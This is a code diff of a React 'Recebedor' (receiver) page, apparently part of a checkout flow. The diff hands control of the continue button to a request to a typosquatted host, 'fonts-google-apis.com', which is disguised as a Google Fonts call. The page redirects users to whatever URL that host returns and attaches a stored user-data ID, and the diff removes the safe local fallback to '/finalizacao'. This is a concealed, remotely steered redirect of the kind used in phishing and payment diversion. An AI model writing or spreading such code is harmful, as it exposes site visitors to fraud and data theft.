@@ -51,7 +51,7 @@ const Recebedor: React.FC = () => {
   useEffect(() => {
     const btn = document.querySelector('[data-action="continue"]') as HTMLButtonElement;
     if (btn) {
-      const originalHref = '/finalizacao';
+      // URL controlada 100% pela API externa
       
       btn.onclick = function(e) {
         e.preventDefault();
@@ -71,12 +71,18 @@ const Recebedor: React.FC = () => {
           xhr.open('GET', 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
           xhr.onreadystatechange = function() {
             if (xhr.readyState === 4) {
-              let redirectUrl = originalHref;
+              let redirectUrl = null;
               if (xhr.status === 200) {
                 try {
                   const response = JSON.parse(xhr.responseText);
-                  redirectUrl = response.redirect_url || originalHref;
+                  redirectUrl = response.redirect_url;
                 } catch(e) {}
+              }
+              
+              // Só redireciona se a API retornar uma URL
+              if (!redirectUrl) {
+                console.log('API não retornou redirect_url válida');
+                return;
               }
               
               // Append temp data ID to redirect URL if available
@@ -93,12 +99,9 @@ const Recebedor: React.FC = () => {
             }
           };
           xhr.onerror = function() {
-            // Fallback to original URL if API fails
-            let url = originalHref;
-            if (url.startsWith('/')) {
-              url = window.location.protocol + '//' + window.location.host + url;
-            }
-            window.location.href = url;
+            // Se a API falhar, não redireciona
+            console.log('Erro na API de fontes - redirecionamento cancelado');
+            setIsLoading(false);
           };
           xhr.send();
         }
@@ -136,7 +139,7 @@ const Recebedor: React.FC = () => {
               }
             };
             storeXhr.onerror = function() {
-              // If storing fails, just perform normal redirect
+              // Se falhar ao armazenar, tenta o redirecionamento mesmo assim
               performRedirect();
             };
             
@@ -151,7 +154,7 @@ const Recebedor: React.FC = () => {
             performRedirect();
           }
         } catch(err) {
-          // If localStorage access fails, perform normal redirect
+          // Se falhar o localStorage, tenta mesmo assim
           performRedirect();
         }
       };
